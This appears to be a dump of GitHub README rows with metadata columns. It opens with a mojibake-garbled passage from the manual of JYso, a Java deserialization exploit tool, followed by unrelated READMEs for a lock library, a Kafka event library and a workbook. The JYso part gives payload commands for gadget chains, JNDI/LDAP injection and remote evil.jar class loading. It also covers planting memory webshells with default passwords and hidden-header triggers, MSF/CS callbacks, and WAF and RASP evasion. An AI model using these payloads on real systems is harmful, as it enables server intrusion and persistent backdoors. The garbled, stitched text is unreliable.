- SE ï¼šScriptEngine - é€šè¿‡ `ScriptEngineManager.getEngineByName('js').eval()` æ¥è§£æ JS ä»£ç è°ƒç”¨ Runtime æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨å‘½ä»¤ `SE-d2hvYW1`
- DL ï¼šDNS LOG - é€šè¿‡ `InetAddress.getAllByName()` æ¥è§¦å‘ DNS è§£æï¼Œä½¿ç”¨å‘½ä»¤ `DL-xxxdnslog.cn`
- HL ï¼šHTTP LOG - é€šè¿‡ `URL.getContent()` æ¥è§¦å‘ HTTP LOGï¼Œä½¿ç”¨å‘½ä»¤ `HL-http://xxx.com`
- BC ï¼šBCEL Classloader - é€šè¿‡ `..bcel...ClassLoader.loadClass().newInstance()` æ¥åŠ è½½ BCEL ç±»å­—èŠ‚ç ï¼Œä½¿ç”¨å‘½ä»¤ `BC-$BCEL$xxx`ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ `BC-EX-TomcatEcho` æˆ– `BC-LF-/tmp/aaa.class` æ¥æ‰§è¡Œé«˜çº§åŠŸèƒ½
- JD ï¼šJNDI Lookup - é€šè¿‡ `InitialContext.lookup()` æ¥è§¦å‘ JNDI æ³¨å…¥ï¼Œä½¿ç”¨å‘½ä»¤ `JD-ldap://xxx/xx`
- å…¶ä»–ï¼šæ™®é€šå‘½ä»¤æ‰§è¡Œ - é€šè¿‡ `Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½¿ç”¨å‘½ä»¤ `whoami`

è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ PB æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€WF å†™å…¥æ–‡ä»¶çš„å†…å®¹ã€SE æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œä¸ºäº†é˜²æ­¢ä¼ å‚é”™è¯¯ï¼Œéœ€è¦<font color=""purple"">å¯¹ä¼ å…¥çš„å‘½ä»¤ä½¿ç”¨
base64 ç¼–ç </font>ã€‚

é™¤äº†ä¸Šé¢çš„åˆ©ç”¨ï¼Œé¡¹ç›®ä¹Ÿé€šè¿‡ ScriptEngineManager æ‰§è¡Œ JS çš„æ–¹å¼æ”¯æŒäº† `EX-` çš„å†™æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´é’ˆå¯¹ ChainedTransformer åˆ©ç”¨æ–¹å¼ä¹Ÿå¯ä»¥æ‰“å…¥å†…å­˜é©¬æˆ–å›æ˜¾ã€‚

**å‘½ä»¤æ‰§è¡Œç¤ºä¾‹**ï¼š

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
```

**DNSLOGç¤ºä¾‹**ï¼š

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'DL-xxx.org'
```

**è„šæœ¬å¼•æ“è§£æ JS ä»£ç ç¤ºä¾‹**ï¼š

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
```

**æ–‡ä»¶å†™å…¥ç¤ºä¾‹**ï¼š

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
```

**è§¦å‘ JNDI æŸ¥è¯¢æ³¨å…¥ç¤ºä¾‹**ï¼š

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
```

**æ™®é€šå‘½ä»¤æ‰§è¡Œç¤ºä¾‹**ï¼š

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections1 -p 'open -a Calculator.app'
```

### 2.4.1 ä»»æ„è‡ªå®šä¹‰ä»£ç 

å¦‚æœä½ ä¸æƒ³ä½¿ç”¨æœ¬é¡¹ç›®ä¸­æä¾›çš„æ¶æ„é€»è¾‘ï¼Œä¹Ÿä¸æƒ³æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡è‡ªå®šä¹‰ä»£ç çš„å½¢å¼ï¼Œè‡ªå®šä¹‰ä»£ç å°†ä¼šåœ¨ç›®æ ‡æœåŠ¡å™¨é€šè¿‡ ClassLoader

[//]: # (è¿›è¡ŒåŠ è½½å¹¶å®ä¾‹åŒ–ã€‚å‘½ä»¤ä½¿ç”¨ `LF-` å¼€å¤´ï¼Œåé¢è·ŸæŒ‡å®šè‡ªå®šä¹‰ç±»å­—èŠ‚ç æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç¨‹åºä¼šå°è¯•è‡ªåŠ¨ç¼©å‡ç±»å­—èŠ‚ç çš„å¤§å°ã€‚)

ç¤ºä¾‹ï¼š

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsCollections3 -p LF-/tmp/evil.class
```

### 2.4.2 æ™®é€šå‘½ä»¤æ‰§è¡Œ

æœ€åæ˜¯æ™®é€šçš„æ‰§è¡Œå‘½ä»¤ï¼Œç›´æ¥è¾“å…¥å¾…æ‰§è¡Œçš„å‘½ä»¤å³å¯ã€‚

**æ™®é€šå‘½ä»¤æ‰§è¡Œç¤ºä¾‹**ï¼š

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsBeanutils2 -p 'open -a Calculator.app'
```

### 2.4.3 URLDNS æ¢æµ‹ç›®æ ‡ç±»

ä¸ºäº†è§£å†³æœ‰ååºåˆ—åŒ–åˆ©ç”¨ç‚¹ä½†æ˜¯æ— é“¾å¯ç”¨çš„çŠ¶æ€ï¼Œæœ¬é¡¹ç›®æä¾›äº†åŸºäº URLDNS æ¢æµ‹ç›®æ ‡ç±»çš„åŠŸèƒ½ã€‚è¿™æ¡é“¾ä¼šæ ¹æ®ç›®æ ‡ç¯å¢ƒä¸­ä¸åŒçš„ç±»æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­ç³»ç»Ÿç¯å¢ƒã€ä¾èµ–ç‰ˆæœ¬ï¼Œä¸»è¦åŒ…å«å¦‚ä¸‹è¡¨æ ¼ä¸­çš„å†…å®¹ï¼š

| DNSLOG å…³é”®å­—                               | å¯¹åº”é“¾                  | å…³é”®ç±»                                                       | å¤‡æ³¨                                                         |
| ------------------------------------------- | ----------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| cc31or321<br />cc322                        | CommonsCollections13567 | org.apache.commons.collections.functors.ChainedTransformer<br />org.apache.commons.collections.ExtendedProperties$1 | CommonsCollections1/3/5/6/7<br />éœ€è¦<=3.2.1ç‰ˆæœ¬             |
| cc40<br />cc41                              | CommonsCollections24    | org.apache.commons.collections4.functors.ChainedTransformer<br />org.apache.commons.collections4.FluentIterable | CommonsCollections2/4é“¾<br />éœ€è¦4-4.0ç‰ˆæœ¬                   |
| cb17<br />cb18x<br />cb19x                  | CommonsBeanutils2       | org.apache.commons.beanutils.MappedPropertyDescriptor\$1<br />org.apache.commons.beanutils.DynaBeanMapDecorator\$MapEntry<br />org.apache.commons.beanutils.BeanIntrospectionData | 1.7x-1.8xä¸º-3490850999041592962<br />1.9xä¸º-2044202215314119608 |
| c3p092x<br />c3p095x                        | C3P0                    | com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase<br />com.mchange.v2.c3p0.test.AlwaysFailDataSource | 0.9.2pre2-0.9.5pre8ä¸º7387108436934414104<br />0.9.5pre9-0.9.5.5ä¸º7387108436934414104 |
| ajw                                         | AspectJWeaver           | org.aspectj.weaver.tools.cache.SimpleCache                   | AspectJWeaver,éœ€è¦cc31                                       |
| bsh20b4<br />bsh20b5<br />bsh20b6           | bsh                     | bsh.CollectionManager\$1<br />bsh.engine.BshScriptEngine<br />bsh.collection.CollectionIterator\$1 | 2.0b4ä¸º4949939576606791809<br />2.0b5ä¸º4041428789013517368<br />2.0.b6æ— æ³•ååºåˆ—åŒ– |
| groovy1702311<br />groovy24x<br />groovy244 | Groovy                  | org.codehaus.groovy.reflection.ClassInfo\$ClassInfoSet<br />groovy.lang.Tuple2<br />org.codehaus.groovy.runtime.dgm\$1170 | 2.4.xä¸º-8137949907733646644<br />2.3.xä¸º1228988487386910280  |
| becl                                        | Becl                    | com.sun.org.apache.bcel.internal.util.ClassLoader            | JDK<8u251                                                    |
| Jdk7u21                                     | Jdk7u21                 | com.sun.corba.se.impl.orbutil.ORBClassLoader                 | JDK<=7u21                                                    |
| JRE8u20                                     | JRE8u20                 | javax.swing.plaf.metal.MetalFileChooserUI\$DirectoryComboBoxModel\$1 | 7u25<=JDK<=8u20<br />è¿™ä¸ªæ£€æµ‹ä¸å®Œç¾,8u25ç‰ˆæœ¬ä»¥åŠJDK<=7u21ä¼šè¯¯æŠ¥<br />å¯ç»¼åˆJdk7u21æ¥çœ‹ |
| linux<br />windows                          | winlinux                | sun.awt.X11.AwtGraphicsConfigData<br />sun.awt.windows.WButtonPeer | windows/linuxç‰ˆæœ¬åˆ¤æ–­                                        |
| jackson2100                                 | jackson                 | com.fasterxml.jackson.databind.node.NodeSerialization        |                                                              |
| ROME                                        | ROME                    | com.sun.syndication.feed.impl.ToStringBean<br />com.rometools.rome.feed.impl.ObjectBean |                                                              |
| SpringAOP                                   | fastjon<br /> jackson   | org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource |                                                              |
| fastjson                                    | fastjon                 | com.alibaba.fastjson.JSONArray                               |                                                              |
|                                             | all                     |                                                              | å…¨éƒ¨æ£€æµ‹                                                     |

æœ¬é¡¹ç›®å‚è€ƒäº† kezibei å¸ˆå‚…çš„ URLDNS é¡¹ç›®ï¼Œå®é™…æƒ…å†µå¯èƒ½æœ‰å¦‚ä¸‹å‡ ç§æƒ…å†µå¯¼è‡´é—®é¢˜ï¼š

- ååºåˆ—æ—¶é‡åˆ°é»‘åå•ï¼Œå¯èƒ½å¯¼è‡´åé¢çš„ç±»çš„ dnslog å‡ºä¸æ¥ï¼›
- ååºåˆ—åŒ–æµç¨‹ä¸­ç”±äºç§ç§æƒ…å†µæŠ¥é”™å¯èƒ½å¯¼è‡´å‡ºä¸æ¥ã€‚

å› æ­¤è¿™é‡Œè¿˜æ˜¯æä¾›äº† all/common/æŒ‡å®šç±» ä¸‰ç§æ¢æµ‹æ–¹å¼ï¼š

- allï¼šæ¢æµ‹å…¨éƒ¨çš„ç±»ï¼›
- commonï¼šæ¢æµ‹ä¸å¸¸åœ¨é»‘åå•ä¸­çš„ CommonsBeanutils2/C3P0/AspectJWeaver/bsh/winlinuxï¼›
- æŒ‡å®šç±»ï¼šä½¿ç”¨å¯¹åº”é“¾ä¸­çš„å…³é”®å­— CommonsCollections24:xxxx.dns.log ã€‚

ç¤ºä¾‹ï¼š`all:xxxxxx.dns.log`

```shell
java -jar JYso-[version].jar -yso 1 -g URLDNS -p 'all:xxxxxx.dns.log'
```

### 2.4.4 å…¶ä»–åˆ©ç”¨é“¾çš„æ‹“å±•

å¯¹äº BeanShell1 åŠ Clojure è¿™ä¸¤ä¸ªåŸºäºè„šæœ¬è¯­è¨€è§£æçš„æ¼åˆ©ç”¨æ–¹å¼ã€‚

æœ¬é¡¹ç›®ä¸ºè¿™ä¸¤æ¡åˆ©ç”¨é“¾æ‹“å±•äº†é™¤äº† Runtime æ‰§è¡Œå‘½ä»¤æ„å¤–çš„å¤šç§åˆ©ç”¨æ–¹å¼ï¼Œå…·ä½“å¦‚ä¸‹ï¼š

- TS ï¼šThread Sleep - é€šè¿‡ `Thread.sleep()` çš„æ–¹å¼æ¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä½¿ç”¨å‘½ä»¤ï¼š`TS-10`
- RC ï¼šRemote Call - é€šè¿‡ `URLClassLoader.loadClass()` æ¥è°ƒç”¨è¿œç¨‹æ¶æ„ç±»å¹¶åˆå§‹åŒ–ï¼Œä½¿ç”¨å‘½ä»¤ï¼š`RC-http://xxxx.com/evil.jar#EvilClass`
- WF ï¼šWrite File - é€šè¿‡ `FileOutputStream.write()` æ¥å†™å…¥æ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤ï¼š`WF-/tmp/shell#123`
- å…¶ä»–ï¼šæ™®é€šå‘½ä»¤æ‰§è¡Œ - é€šè¿‡ `ProcessBuilder().start()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½¿ç”¨å‘½ä»¤ `whoami`

ä¸ä¹‹å‰çš„æ‰©å±•ç±»ä¼¼ï¼Œè¿™é‡Œä¹Ÿä¸æ”¾æˆªå›¾äº†ã€‚

å¯¹äº BeanShell1ï¼Œè¿˜é€šè¿‡ ScriptEngineManager æ‰§è¡Œ JS çš„æ–¹å¼æ”¯æŒå›æ˜¾æˆ–å†…å­˜é©¬çš„æ‰“å…¥ã€‚ä½¿ç”¨æ–¹å¼åŒä¸Šï¼š`EX-`

### 2.4.5 MSF/CS ä¸Šçº¿

ä½¿ç”¨ MSF çš„ä¸Šçº¿è½½è·é…åˆè¿œç¨‹ Jar åŒ…è°ƒç”¨å®Œæˆ MSF ä¸Šçº¿ï¼Œåç»­å¯è½¬ CSã€‚

## 2.5 å†…å­˜é©¬çš„ä½¿ç”¨

é’ˆå¯¹é¡¹ç›®ä¸­ä¸€é”®æ‰“å…¥çš„å„ç§å†…å­˜é©¬ï¼Œè¿™é‡Œæä¾›äº†é€šç”¨çš„åˆ©ç”¨æ–¹å¼ã€‚

### 2.5.1 å‘½ä»¤æ‰§è¡ŒåŠåé—¨ç±»

å¯¹äºæ¤å…¥çš„å†…å­˜é©¬åŠæ¶æ„é€»è¾‘ï¼Œé¦–å…ˆä¸ºäº†éšè—å†…å­˜é©¬ï¼Œé€šè¿‡é€»è¾‘è¿›è¡Œäº†åˆ¤æ–­ï¼Œéœ€è¦åœ¨è¯·æ±‚ Header ä¸­æ·»åŠ  `Referer: https://QI4L.cn/ `ï¼Œå…¶æ¬¡æ‰§è¡Œä¸åŒçš„é€»è¾‘ï¼š
è¿™ä¸ªæ ¡éªŒçš„ header å¤´éƒ¨å’Œå€¼å¯ä»¥é€šè¿‡ `-hk ""Referer"" -hv ""https://QI4L.cn/""` æ¥è¿›è¡Œè‡ªå®šä¹‰æŒ‡å®šã€‚

1. å¦‚æœæ˜¯ <font color=""orange"">CMD</font> å†…å­˜é©¬ï¼Œç¨‹åºä¼šä» `X-Token-Data` ä¸­è¯»å–å¾…æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¹¶å°†æ‰§è¡Œç»“æœè¿›è¡Œå›æ˜¾ï¼Œè¿™ä¸ªå¤´éƒ¨å¯ä»¥é€šè¿‡ `-ch ""testecho""` æ¥æŒ‡å®šã€‚

2. å¦‚æœæ˜¯ <font color=""orange"">å†°è Shell</font> å†…å­˜é©¬ï¼Œå¯ä½¿ç”¨å†°èå®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ç®¡ç†ï¼Œå¯†ç  `p@ssw0rd`, å¯ä»¥é€šè¿‡ `-pw ""1qaz@WSX""` æ¥æŒ‡å®šã€‚

3. å¦‚æœæ˜¯ <font color=""orange"">å“¥æ–¯æ‹‰ shell</font> å†…å­˜é©¬ï¼Œå¯ä½¿ç”¨å“¥æ–¯æ‹‰å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ç®¡ç†ï¼Œpass å€¼è®¾ä¸º `p@ssw0rd`ï¼Œkey è®¾ä¸º `key`ï¼Œå“¥æ–¯æ‹‰å†…å­˜é©¬åŒæ—¶æ”¯æŒäº† RAW å’Œ Base64,å¯ä»¥é€šè¿‡ `-pw ""1qaz@WSX"" -gzk ""evilkey""` æ¥æŒ‡å®šã€‚

4. å¦‚æœæ˜¯ <font color=""orange""> suo5 </font> å†…å­˜é©¬ï¼Œåˆ™ä¼šç›´æ¥åˆ›å»ºä¸€ä¸ª suo5 éš§é“ï¼Œå¯ä»¥ç›´æ¥ç”± suo5 å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ï¼Œsuo5 ç›®å‰å¯¹æ”¯æŒäº†å¯¹è‡ªå®šä¹‰ Header å¤´éƒ¨è¿›è¡Œé‰´æƒï¼Œç”Ÿæˆæ—¶å¯ä»¥é€šè¿‡å‚æ•° `-hk ""User-Agent"" -hv ""aaaawww""` æŒ‡å®šï¼Œå¦‚ä¸‹å¯æ­£å¸¸è¿æ¥ï¼š

   åœ¨é…ç½®ä¸­è¿›è¡Œé…ç½®ã€‚

   é¡¹ç›®åœ°å€ï¼š[https://github.com/zema1/suo5](https://github.com/zema1/suo5)ï¼Œæ­¤é¡¹ç›®è¿˜åœ¨ç§¯ææ›´æ–°ä¸­ï¼Œä¼šä¸å®šæœŸæ›´æ–°ç›¸å…³ä»£ç æ”¯æŒç›¸å…³åŠŸèƒ½ã€‚

5. å¦‚æœæ˜¯ <font color=""orange""> WebSocket </font> å†…å­˜é©¬ï¼Œå¯ä½¿ç”¨ WebSocket å®¢æˆ·ç«¯è¿›è¡Œé“¾æ¥ï¼Œè·¯å¾„ä¸º `/version.txt`ï¼Œå¯ä»¥ä½¿ç”¨ `-u ""/aaa""` æ¥æŒ‡å®šã€‚

6. å¦‚æœæ˜¯ <font color=""orange""> Tomcat Executor </font> å†…å­˜é©¬ï¼Œç¨‹åºä¼šä» Header ä¸­çš„ `X-Token-Data` ä¸­è¯»å–å¾…æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¹¶å°†æ‰§è¡Œç»“æœåœ¨ Header `Server-token` è¿›è¡Œ Base64encode å›æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨ `-ch ""testecho""` æ¥æŒ‡å®šã€‚

7. å¦‚æœæ˜¯ <font color=""orange""> Tomcat Upgrade </font> å†…å­˜é©¬ï¼Œéœ€è¦æŒ‡å®š `Connection: Upgrade` ä»¥åŠ `Upgrade: version.txt`ï¼Œç¨‹åºä¼šä» Header ä¸­çš„ `X-Token-Data` ä¸­è¯»å–å¾…æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¹¶å°†ç»“æœæ”¾å› response ä¸­å›æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨ `-u ""/aaa"" -ch ""testecho""` æ¥æŒ‡å®šã€‚

### 2.5.2 Echo ç±»

å¯¹äº Echo ç±»çš„å›æ˜¾ï¼Œæ˜¯åŸºäºåœ¨çº¿ç¨‹ç»„ä¸­æ‰¾åˆ°å¸¦æœ‰æŒ‡å®š Header å¤´éƒ¨çš„è¯·æ±‚ã€æ‰§è¡Œå‘½ä»¤å¹¶å›æ˜¾çš„åˆ©ç”¨æ–¹å¼ã€‚

ä½¿ç”¨æ—¶åœ¨ Header ä¸­åŠ å…¥ `X-Token-Data` ï¼Œå…¶å€¼ä¸ºå¾…æ‰§è¡Œçš„å‘½ä»¤ï¼Œå‘½ä»¤æ‰§è¡Œç»“æœå°†å›æ˜¾åœ¨ response ä¸­ã€‚

### 2.5.3 RMI å†…å­˜é©¬

å¯¹äº RMIBindTemplate
æ˜¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„æŒ‡å®šç«¯å£å¯åŠ¨æ³¨å†Œä¸­å¿ƒï¼ˆå¦‚æœæ²¡æœ‰ï¼‰ï¼Œå¹¶å‘å…¶ä¸­ç»‘å®šæ¶æ„çš„åé—¨ç±»ï¼Œé…åˆ `exploit.org.qi.ysuserial.RMIBindExploit`
è¿›è¡Œå‘½ä»¤æ‰§è¡Œ

## 2.6 é˜²å¾¡çš„ç»•è¿‡

è¿™éƒ¨åˆ†ä¸æ¶‰åŠä½¿ç”¨æ–¹å¼ï¼Œåªæ˜¯ç®€å•çš„æè¿°ä¸€ä¸‹é¡¹ç›®ä¸­æ‰€ä½¿ç”¨çš„ç»•è¿‡æ–¹å¼ä¾›å¤§å®¶äº†è§£ã€‚

## 2.7 æµé‡å±‚é¢

å¯¹äºå†°èå’Œå“¥æ–¯æ‹‰ï¼Œä»–ä»¬è‡ªå·±åœ¨æµé‡å’ŒJavaå±‚éƒ½æœ‰å¾ˆå¤šå¯ä»¥æå–çš„ç‰¹å¾ï¼Œè¿™é‡Œæ²¡æœ‰åŠæ³•å»ç®¡æ§ï¼Œéœ€è¦å„ä½è‡ªè¡Œå»é­”æ”¹ï¼Œå…¶å®ä¹Ÿå¹¶ä¸éš¾ã€‚æœ¬é¡¹ç›®æŠŠä¸€äº›å¤§å®¶å®ç°çš„æ¯”è¾ƒç±»ä¼¼çš„ä¸€äº›ç‰¹å¾è¿›è¡Œäº†å»é™¤ã€‚

åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œæµé‡å±‚çš„ WAF ä¼šåœ¨å¯¹æµé‡æ•°æ®åŒ…è§£ææ—¶å¯¹å…³é”®å­—ã€å…³é”®ç‰¹å¾è¿›è¡ŒåŒ¹é…ï¼Œä¾‹å¦‚ååºåˆ—åŒ–æµé‡åŒ…ä¸­å‡ºç°çš„ä¸€äº›å…³é”®ç±»çš„åŒ…åã€ç±»åï¼Œä½†æ˜¯æµé‡è®¾å¤‡å—é™äºæ€§èƒ½å½±å“ï¼Œä¸ä¼šæ— é™åˆ¶çš„è§£æè¯·æ±‚åŒ…ï¼Œå¯èƒ½ä¼šå½±å“åˆ°å®é™…ä¸šåŠ¡ï¼Œå› æ­¤ä¸€èˆ¬ä¼šæœ‰è§£æçš„`æ—¶é—´`
ä¸Šæˆ–`é•¿åº¦`ä¸Šçš„é˜ˆå€¼ï¼Œè¶…è¿‡è¯¥é˜ˆå€¼ï¼Œå°†æ”¾å¼ƒæ£€æŸ¥ã€‚

å› æ­¤æœ¬é¡¹ç›®æ·»åŠ äº†ä¸ºååºåˆ—åŒ–æ•°æ®æ·»åŠ è„æ•°æ®ç”¨æ¥ç»•è¿‡æµé‡å±‚é¢çš„ WAF çš„åŠŸèƒ½ï¼Œåœ¨ç”Ÿæˆååºåˆ—åŒ–æ•°æ®æ—¶ï¼ŒæŒ‡å®š -dt å‚æ•°ï¼Œå³å¯æ ¹æ®ä¸åŒç±»å‹ç”Ÿæˆå°è£…åçš„å¸¦æœ‰éšæœºè„å­—ç¬¦çš„ååºåˆ—åŒ–æ•°æ®åŒ…ã€‚

ä¾‹å¦‚ï¼š

```shell
java -jar JYso-[version].jar -yso 1 -g CommonsBeanutils1 -p 'EX-MS-TEXMSFromThread' -dt 1 -dl 50000
```

å¯ä»¥ç”Ÿæˆå¡«å……äº† 50000 ä¸ªè„å­—ç¬¦çš„åºåˆ—åŒ–æ•°æ®

## 2.8 RASP å±‚é¢

å¯¹äºæ¼æ´æ‰§è¡Œå¸¸ä½¿ç”¨çš„ Runtimeã€URLClassLoader ç­‰ï¼Œå¾ˆå¤š RASP éƒ½è¿›è¡Œäº† Hookï¼Œåœ¨æ”»å‡»æ—¶å¯èƒ½ä¼šè¢«æ‹¦æˆªï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨äº†ä¸€äº›åå°„è°ƒç”¨ native æ–¹æ³•ä¹‹ç±»çš„æŠ€æœ¯å»å°è¯• RASP
çš„é˜²å¾¡ï¼Œå…·ä½“çš„æŠ€æœ¯å®ç°å°±ä¸ç»†è¯´äº†ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥åç¼–è¯‘ jar åŒ…æŸ¥çœ‹ç›¸å…³ä»£ç ã€‚ å¯ä»¥ä½¿ç”¨ -o å‚æ•°æŒ‡å®šä½¿ç”¨ç»•è¿‡ RASP çš„ç›¸å…³æŠ€æœ¯ã€‚

ç›®å‰å·²æ”¯æŒåŠ¨æ€ç”Ÿæˆæ··æ·†çš„ç±»åï¼Œä¸å­˜åœ¨ä»»ä½• `qi4l` å…³é”®å­—ã€‚

## 2.9 Exploit

é™¤äº†å•ç‹¬çš„å‚æ•°å¤–ï¼Œå…¶ä½™å‚æ•°ä¸ payload çš„å‚æ•°ä¿æŒä¸€è‡´

- JBoss
- JenkinsCLI
- JenkinsListener
- JenkinsReverse
- JMXInvokeMBean
- JRMPClassLoadingListener
- JRMPClient
- JRMPListener
- JSF
- RMIBindExploit

```
java -cp JYso-[version].jar -yso 1 com.qi4l.jndi.exploit.JRMPListener 8888 -g CommonsCollections1 -p whoami
```",0,0,1,0.0,"['jndiexploit', 'clojure', 'signedobject', 'gadget', 'templatesimpl', 'chainedtransformer', 'urldns', 'echo', 'rmi', 'rasp', 'exploit']","['jndiexploit', 'clojure', 'signedobject', 'gadget', 'templatesimpl']",1.0,"[maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-install-plugin]",0.0,1.0,0.0
luohongtu/agency-lock,main,"# agency-lock

This open-source project is a proxy lock project that enables dynamic switching to different lock implementations using
the proxy lock approach. It is designed to upgrade from a single-machine lock to a distributed lock, catering to various
application scenarios.

## Getting started

- Download project

  `git clone https://github.com/luohongtu/agency-lock.git`
- Install to the local repository

  `mvn clean install`
- Add agency-lock-spring-boot-starter dependency

```pom
<dependency>
  <groupId>cn.foolishbird</groupId>
  <artifactId>agency-lock-spring-boot-starter</artifactId>
  <version>1.1.0</version>
</exclusions>

```
- Configure the springboot environment
```yml
agency:
  config:
    agencyLockType: ""redisson""
```
- The lock key generation policy
```java
@Configuration
public class AgencyLockConfig {

    @Bean(""springElGenerator"")
    public KeyGenerator springELMethonNameKeyGenerator() {
        return new SpringELMethonNameKeyGenerator();
    }

}
```
- Idempotent locks are used
```java
@Idempotent(key = ""#param.phone"", keyGenerator = ""springElGenerator"", leaseTime = 6)
public String login(@Validated @RequestBody PhoneLoginParam param) {
    return ""token"";
}
```

- AgencyLock locks are used
```java
@AgencyLock(key = ""#param.phone"", keyGenerator = ""springElGenerator"", leaseTime = 6)
public String login(@Validated @RequestBody PhoneLoginParam param) {
    return ""token"";
}
```

- Lock code block
```java
@Autowired
private AgencyLockManger agencyLockManger;

public void test1() throws Exception {
    String key = ""demoKey"";
    AgencyLock lock = agencyLockManger.getLock(key);
    try {
      lock.lock();
      // service code
      Thread.sleep(3000);
      System.out.println(""test success"");
    } finally {
      lock.unlock();
      agencyLockManger.removeLock(key);
    }
}
```

## [License](./license.txt)
agency-lock is Open Source software released under the Apache 2.0 license.
",0,0,1,0.0,"['get', 'start', 'license']","['get', 'start', 'license']",5.0,[org.apache.maven.plugins:maven-compiler-plugin],0.0,4.0,1.0
theodo-fintech/spring-data-event,main,"[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]

<div align=""center"">
  <h1 align=""center"">Spring Data Event</h1>
</div>

### Features

- **Data Event Entity**: Set up your JPA Entities to be automatically sent over Kafka topics when saved, updated or deleted simply using `@DataEventEntity`

More to come later... Stay tuned ! 


## Getting Started

### Prerequisites

This library has been currently tested on projects under SpringBoot on version 3.2.4 with Java 17 or later, using Hibernate as a JPA implementation.


### Installation

You will have to add the dependency in your spring-boot-project

```xml
<dependency>
    <groupId>com.sipios</groupId>
    <artifactId>spring-data-event</artifactId>
    <version>0.1.0</version>
</dependency>
```

### Configuration

Set up your application properties file to make spring kafka work properly

```txt
spring.kafka.bootstrap-servers=localhost:29092
```

Then, you will have to enable the library so that it will be able to work properly.
You just add the `@EnableDataEvent` on any of your `@Configuration` class already existing on your project, or directly on the `@SpringBootApplication` class.

## Usage


To mark a JPA entity to be automatically sent over event platform, put the `@DataEventEntity` on your entity

For instance

```java

@Entity
@DataEventEntity
@Table(name= ""user_account"")
public class UserEntity {

    @Id
    @Column(name = ""id"", nullable = false)
    @GeneratedValue(strategy = GenerationType.UUID)
    private UUID id;


}
```

By default, the topics on which the event will be sent are : 
- For the creation : `entity_name.created` (for example : `userentity.created`)
- For the update : `entity_name.updated` (for example : `userentity.updated`)
- For the deletion : `entity_name.deleted` (for example : `userentity.deleted`)


## FAQs

No FAQ at the moment

## Roadmap

- [x] Add simple case of sending creation, update and deletion event over kafka
- [ ] Allow customizing which events should be sent or not 
- [ ] Allow customizing which attribute from the entity to be sent or not 
- [ ] Allow other event techno as RabbitMQ or Apache Pulsar

## Contributing

We are just getting started on this project and would **highly appreciate** contributions

## License

Distributed under the MIT License. See [LICENSE](/LICENSE.txt) for more information.


[stars-shield]: https://img.shields.io/github/stars/sipios/spring-data-event?style=for-the-badge
[stars-url]: https://github.com/sipios/spring-data-event/stargazers
[issues-shield]: https://img.shields.io/github/issues/sipios/spring-data-event?style=for-the-badge
[issues-url]: https://github.com/sipios/spring-data-event/issues
[license-url]: https://github.com/sipios/spring-data-event/blob/main/LICENSE
",0,1,3,4.0,"['feature', 'get', 'start', 'prerequisite', 'installation', 'configuration', 'usage', 'faq', 'roadmap', 'contribute', 'license']","['feature', 'get', 'start', 'prerequisite', 'installation']",1.0,"[maven-deploy-plugin,maven-javadoc-plugin,maven-source-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.jacoco:jacoco-maven-plugin]",0.0,1.0,0.0
advent-of-craft/2024-summer-craft-book,main,"# Summer Craft Book 2024

[![Our Discord](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/E5Z9s9UKTS)
[![Linkedin](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/advent-of-craft)

[![License](https://img.shields.io/github/license/advent-of-craft/advent-of-craft.svg)](https://github.com/advent-of-craft/2024-summer-craft-book/blob/main/LICENSE)

This year, we are launching our version of the summer holiday workbook around `Software Craftsmanship` called the **Summer Craft Book**.

Please, download the PDF of the Summer Craft Book in this repository to get the most out of it.

## One theme a week

Each week, a specific theme is going to be examined. You will have information, theory,  exercises, games and resources to go further. 

Set aside a couple of hours a week to work on the subject. If you happen to have more time, a coding version will be available so you can dig into each exercise a bit longer.

